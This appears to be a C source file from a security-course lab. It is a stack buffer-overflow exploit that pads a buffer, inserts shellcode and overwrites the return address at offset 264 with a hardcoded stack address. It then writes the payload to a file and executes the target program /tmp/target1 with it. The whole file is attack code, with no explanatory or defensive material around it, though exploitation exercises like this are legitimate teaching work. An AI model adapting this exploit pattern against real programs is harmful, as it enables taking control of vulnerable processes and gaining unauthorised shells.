#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target1"
#define DEFAULT_OUTPUT "/tmp/xploit1_output"

int main(int argc, char *argv[])
{
  // TODO determin size of exploit
  char exploit[256 + sizeof(shellcode)];

  // TODO fill exploit buffer
  memset(exploit, '\xff', sizeof(exploit));
  memcpy(exploit, shellcode, sizeof(shellcode) - 1);

  // entender melhor
  *(size_t *)(exploit + 264) = 0x7fffffffdc20;

  // Write the exploit buffer to a file 
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed.");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
